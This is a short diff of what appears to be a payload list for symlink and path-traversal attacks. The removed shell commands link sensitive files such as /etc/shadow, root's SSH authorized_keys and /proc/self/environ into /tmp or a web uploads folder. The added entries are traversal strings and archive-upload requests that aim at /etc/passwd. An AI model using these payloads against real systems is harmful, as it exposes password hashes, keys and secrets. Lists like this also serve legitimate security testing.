@@ -1,7 +1,8 @@
-ln -s /etc/passwd /tmp/exploit
-ln -s /root/.ssh/authorized_keys /tmp/keys
-ln -s /etc/shadow /var/www/uploads/shadow.txt
-ln -sf /proc/self/environ /tmp/env
-ln -s /var/log/auth.log /tmp/auth
-ln -s /etc/crontab /tmp/cron
-ln -s /root/.bash_history /tmp/hist
+/tmp/symlink -> /etc/passwd
+/var/www/html/uploads/link.txt -> /etc/shadow
+POST /api/upload (archive with symlink: ../../../etc/passwd)
+POST /extract (tar with ../../etc/passwd symlink)
+/proc/self/root/etc/passwd
+/proc/self/cwd/../../etc/passwd
+/dev/stdin -> target file
+filename=../../../../etc/passwd (symlink follow)
